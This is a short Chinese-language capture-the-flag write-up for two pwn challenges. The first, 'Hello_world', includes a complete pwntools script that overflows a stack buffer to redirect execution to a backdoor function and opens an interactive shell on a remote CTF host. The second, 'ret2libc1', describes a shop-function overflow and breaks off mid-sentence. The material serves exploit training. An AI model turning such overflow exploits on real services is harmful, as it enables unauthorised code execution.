# Hello_world
签到题，利用栈溢出漏洞劫持返回函数至backdoors即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
ip = 'node2.anna.nssctf.cn'
port = 28485
if local:
	p = process('./Hello_world')
	pwnlib.gdb.attach(p, 'b func1')
else:
	p = remote(ip, port)
	# p = websocket()

payload = b'a' * (0x20 + 8) + b'\xc5'
p.send(payload)
p.interactive()
```
# ret2libc1
菜单题，可以找到栈溢出漏洞在shop函数里
![[Pasted image 20250302221923.png]]
main函数中可以找到当输入7时会执行see_it函数，可以刷钱，刷了钱后便可以